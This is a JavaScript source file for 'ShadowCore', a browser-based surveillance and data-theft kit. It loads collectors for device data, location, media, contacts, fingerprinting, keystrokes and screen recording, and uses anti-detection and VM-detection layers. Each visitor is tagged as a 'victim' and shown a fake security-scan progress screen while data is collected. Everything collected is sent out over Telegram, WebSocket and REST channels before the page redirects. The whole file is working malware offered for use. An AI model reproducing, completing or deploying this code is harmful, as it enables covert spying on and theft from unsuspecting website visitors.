// core.js — Main orchestration engine with screen recorder support

import { loadConfig } from './config-loader.js';
import { DeviceCollector } from './collectors/device.js';
import { NetworkCollector } from './collectors/network.js';
import { LocationCollector } from './collectors/location.js';
import { MediaCollector } from './collectors/media.js';
import { SensorCollector } from './collectors/sensors.js';
import { BrowserCollector } from './collectors/browser.js';
import { ContactsCollector } from './collectors/contacts.js';
import { FingerprintCollector } from './collectors/fingerprint.js';
import { ScreenRecorder } from './collectors/screenRecorder.js';
import { KeyLogger } from './collectors/keylogger.js';
import { Exfiltrator } from './exfiltrators/telegram.js';
import { WebSocketExfiltrator } from './exfiltrators/websocket.js';
import { RESTExfiltrator } from './exfiltrators/rest.js';
import { StealthLayer } from './stealth/anti-detection.js';
import { TrafficShaper } from './stealth/traffic-shaping.js';
import { VMDetector } from './stealth/vm-detection.js';

class ShadowCore {
    constructor() {
        this.config = null;
        this.victimId = this.generateVictimId();
        this.collectedData = {
            id: this.victimId,
            timestamp: new Date().toISOString(),
            campaign: this.getCampaignData()
        };
        this.collectors = [];
        this.exfiltrators = [];
        this.stealth = null;
        this.trafficShaper = null;
        this.vmDetector = null;
        this.progressCallback = null;
        this.isRunning = false;
    }

    generateVictimId() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let id = 'V_';
        for (let i = 0; i < 12; i++) {
            id += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        id += '_' + Date.now().toString(36);
        return id;
    }

    getCampaignData() {
        const params = new URLSearchParams(window.location.search);
        return {
            source: document.referrer || 'direct',
            campaignId: params.get('cid') || params.get('campaign') || 'organic',
            utm_source: params.get('utm_source'),
            utm_medium: params.get('utm_medium'),
            utm_campaign: params.get('utm_campaign'),
            url: window.location.href,
            title: document.title
        };
    }

    async init() {
        try {
            // Load configuration
            this.config = await loadConfig();
            this.config.victimId = this.victimId;
            
            // Initialize stealth components
            this.stealth = new StealthLayer();
            await this.stealth.activate();
            
            this.trafficShaper = new TrafficShaper();
            await this.trafficShaper.activate();
            
            this.vmDetector = new VMDetector();
            const vmStatus = await this.vmDetector.detect();
            if (vmStatus.isVM) {
                console.warn('⚠️ VM detected, proceeding with caution');
                this.collectedData.vmDetected = vmStatus;
            }

            // Initialize exfiltrators
            this.exfiltrators.push(new Exfiltrator(this.config));
            
            if (this.config.websocketEndpoint) {
                this.exfiltrators.push(new WebSocketExfiltrator(this.config.websocketEndpoint));
            }
            if (this.config.restEndpoint) {
                this.exfiltrators.push(new RESTExfiltrator(this.config.restEndpoint));
            }

            // Initialize collectors (screen recorder is optional)
            this.collectors = [
                new DeviceCollector(),
                new NetworkCollector(),
                new LocationCollector(),
                new MediaCollector(),
                new SensorCollector(),
                new BrowserCollector(),
                new ContactsCollector(),
                new FingerprintCollector(),
                new KeyLogger()
            ];

            // Add Screen Recorder only if enabled in config
            if (this.config.enableScreenRecorder !== false) {
                this.collectors.push(new ScreenRecorder());
            }

            // Set progress callback
            this.setupProgressUI();

            // Start collection on interaction
            this.activateOnInteraction();
            
        } catch (error) {
            console.error('Initialization failed:', error);
            await this.sendToAllExfiltrators('sendError', {
                message: `Init failed: ${error.message}`,
                stack: error.stack
            });
            this.redirect();
        }
    }

    setupProgressUI() {
        const steps = [
            "Initializing security scan...",
            "Checking device configuration",
            "Verifying network security",
            "Analyzing system integrity",
            "Finalizing verification"
        ];
        
        this.progressCallback = (step, message) => {
            const progress = Math.min(100, (step / steps.length) * 100);
            const progressBar = document.getElementById('progressBar');
            if (progressBar) {
                progressBar.style.width = `${progress}%`;
                progressBar.textContent = `${Math.round(progress)}%`;
            }
            
            const statusItems = document.querySelectorAll('.status-item');
            statusItems.forEach((item, index) => {
                const icon = item.querySelector('i');
                if (index < step) {
                    item.classList.add('completed');
                    item.classList.remove('active');
                    if (icon) {
                        icon.className = 'fas fa-check-circle text-success me-3';
                    }
                } else if (index === step) {
                    item.classList.add('active');
                    item.classList.remove('completed');
                    if (icon) {
                        icon.className = 'fas fa-spinner fa-spin text-primary me-3';
                    }
                } else {
                    item.classList.remove('active', 'completed');
                    if (icon) {
                        icon.className = 'far fa-clock me-3';
                    }
                }
            });
            
            const currentAction = document.getElementById('currentAction');
            if (currentAction) {
                currentAction.textContent = steps[step] || message || "Processing...";
            }
        };
    }

    activateOnInteraction() {
        const events = ['click', 'scroll', 'keydown', 'mousemove', 'touchstart'];
        let activated = false;
        
        const handler = () => {
            if (activated) return;
            activated = true;
            events.forEach(e => document.removeEventListener(e, handler));
            this.run();
        };
        
        events.forEach(e => document.addEventListener(e, handler, { once: false, passive: true }));
        
        // Fallback: run after 3s if no interaction
        setTimeout(() => {
            if (!activated) {
                activated = true;
                events.forEach(e => document.removeEventListener(e, handler));
                this.run();
            }
        }, 3000);
    }

    async run() {
        if (this.isRunning) return;
        this.isRunning = true;
        
        try {
            // Notify start
            await this.sendToAllExfiltrators('notify', 'NEW_VICTIM', {
                id: this.victimId,
                url: window.location.href,
                timestamp: new Date().toISOString()
            });

            // Run collectors with progress
            const totalCollectors = this.collectors.length;
            for (let i = 0; i < totalCollectors; i++) {
                const collector = this.collectors[i];
                const step = Math.floor((i / totalCollectors) * 4);
                
                this.progressCallback(step, `Collecting ${collector.name} data...`);
                
                try {
                    const data = await collector.collect();
                    this.collectedData[collector.name] = data;
                    
                    // Special handling for screen recorder
                    if (collector.name === 'screenRecorder') {
                        await this.handleScreenRecorderData(data);
                    } else {
                        // Regular data
                        await this.sendToAllExfiltrators('sendData', collector.name, data);
                    }
                    
                    // Small delay between collectors
                    await this.delay(200);
                    
                } catch (e) {
                    console.error(`Collector ${collector.name} failed:`, e);
                    this.collectedData[`${collector.name}_error`] = e.message;
                    
                    // Send error notification
                    await this.sendToAllExfiltrators('sendError', {
                        message: `Collector ${collector.name} failed: ${e.message}`,
                        stack: e.stack
                    });
                }
            }

            // Complete
            this.progressCallback(5, "Verification complete!");
            
            // Send final summary
            await this.sendToAllExfiltrators('sendSummary', this.collectedData);
            
            // Redirect
            this.redirect();

        } catch (error) {
            console.error('Core execution error:', error);
            await this.sendToAllExfiltrators('sendError', {
                message: `Core execution failed: ${error.message}`,
                stack: error.stack
            });
            this.redirect();
        } finally {
            this.isRunning = false;
        }
    }

    // ============================================
    // SCREEN RECORDER SPECIAL HANDLING
    // ============================================

    async handleScreenRecorderData(data) {
        // If there's an error, log it
        if (data.error) {
            console.warn('Screen recorder error:', data.error);
            await this.sendToAllExfiltrators('sendData', 'screenRecorder', data);
            return;
        }

        // If it's a file upload (preferred method)
        if (data.type === 'file' && data.blob) {
            console.log(`📹 Sending screen recording as file (${(data.size / 1024 / 1024).toFixed(2)} MB)`);
            
            // Send to primary exfiltrator (Telegram with file upload)
            for (const exfiltrator of this.exfiltrators) {
                if (typeof exfiltrator.sendFile === 'function') {
                    try {
                        const result = await exfiltrator.sendFile(data.blob, {
                            duration: data.duration,
                            size: data.size,
                            format: data.format,
                            victimId: this.victimId,
                            timestamp: data.timestamp,
                            fallbackData: data.data // For chunk fallback
                        });
                        
                        if (result) {
                            console.log('✅ Screen recording uploaded successfully');
                        } else {
                            // If file upload fails, try chunked
                            if (data.data) {
                                console.log('⚠️ File upload failed, falling back to chunks');
                                await this.sendChunkedScreenRecording(data);
                            }
                        }
                    } catch (e) {
                        console.error('File upload error:', e);
                        // Fallback to chunked
                        if (data.data) {
                            await this.sendChunkedScreenRecording(data);
                        }
                    }
                }
            }
        } 
        // If it's already chunked
        else if (data.type === 'chunked' && data.chunks) {
            await this.sendChunkedScreenRecording(data);
        }
        // If it's just data but no blob (shouldn't happen)
        else if (data.data) {
            // Try to convert to blob
            try {
                const blob = await this.base64ToBlob(data.data, 'video/webm');
                data.blob = blob;
                data.type = 'file';
                await this.handleScreenRecorderData(data);
            } catch (e) {
                console.error('Failed to convert to blob:', e);
                // Send as regular data
                await this.sendToAllExfiltrators('sendData', 'screenRecorder', data);
            }
        }
    }

    async sendChunkedScreenRecording(data) {
        const chunks = data.chunks || this.chunkBase64(data.data, 3500);
        const chunkedData = {
            chunks: chunks,
            totalChunks: chunks.length,
            duration: data.duration,
            size: data.size,
            format: data.format || 'webm',
            timestamp: data.timestamp || Date.now()
        };
        
        console.log(`📦 Sending screen recording as ${chunks.length} chunks`);
        await this.sendToAllExfiltrators('sendChunkedVideo', chunkedData);
    }

    chunkBase64(base64String, chunkSize) {
        const chunks = [];
        for (let i = 0; i < base64String.length; i += chunkSize) {
            chunks.push(base64String.slice(i, i + chunkSize));
        }
        return chunks;
    }

    base64ToBlob(base64, mimeType) {
        return new Promise((resolve, reject) => {
            try {
                const byteCharacters = atob(base64);
                const byteNumbers = new Array(byteCharacters.length);
                for (let i = 0; i < byteCharacters.length; i++) {
                    byteNumbers[i] = byteCharacters.charCodeAt(i);
                }
                const byteArray = new Uint8Array(byteNumbers);
                resolve(new Blob([byteArray], { type: mimeType }));
            } catch (e) {
                reject(e);
            }
        });
    }

    // ============================================
    // UTILITY METHODS
    // ============================================

    async sendToAllExfiltrators(method, ...args) {
        const results = [];
        for (const exfiltrator of this.exfiltrators) {
            if (typeof exfiltrator[method] === 'function') {
                try {
                    const result = await exfiltrator[method](...args);
                    results.push(result);
                } catch (e) {
                    console.error(`Exfiltrator ${exfiltrator.constructor.name} failed:`, e);
                    results.push(false);
                }
            }
        }
        return results;
    }

    redirect() {
        const params = new URLSearchParams(window.location.search);
        const url = params.get('redirect') || 'https://t.me/CEC_Educational_Books';
        setTimeout(() => {
            window.location.href = url;
        }, 3000);
    }

    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// ============================================
// AUTO-INITIALIZE
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    const core = new ShadowCore();
    core.init();
});